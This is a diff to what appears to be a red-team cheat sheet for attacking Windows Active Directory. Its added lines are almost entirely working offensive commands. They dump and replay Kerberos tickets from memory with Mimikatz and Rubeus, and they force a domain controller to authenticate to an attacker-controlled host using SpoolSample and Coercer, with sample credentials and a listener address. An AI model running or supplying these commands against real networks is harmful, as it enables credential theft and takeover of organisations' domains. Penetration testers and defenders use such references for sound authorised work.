@@ -16,11 +16,30 @@ $encodedcommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($s
 
 ### Unconstrained Delegation
 ```
-# Export Kerberos tickets from memory
+# Export Kerberos tickets from memory using Mimikatz
 Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::tickets /export"'
+kerberos::ptt c:\path\to\ticket.kirbi
+
+# Export Kerberos tickets from memory using Rubeus
+.\Rubeus.exe triage
+.\Rubeus.exe dump /luid:0x5379f2 /nowrap
+.\Rubeus.exe ptt /ticket:doIFSDCC[...]
 
 # Monitor Kerberos tickets on unconstrained delegation machine
-Invoke-Rubeus -Command "monitor /internal:5"
+Invoke-Rubeus -Command "monitor /internal:5 /nowrap"
+```
+
+### Coercion
+```
+# SpoolSample
+# https://github.com/leechristensen/SpoolSample
+# https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Spoolsample.ps1
+# https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/authentication-coercion
+.\MS-RPRN.exe \\dc.targetdomain.com \\unconstrained-server.targetdomain.com
+
+# Coercer
+# https://github.com/p0dalirius/Coercer
+coercer coerce -u snovvcrash -p 'Passw0rd!' -f dc.txt -l 10.10.13.37 [--filter-pipe-name efsrpc] [--filter-method-name EfsRpcDuplicateEncryptionInfoFile] --auth-type smb --always-continue --delay 1
 ```
 
 ### DCSync
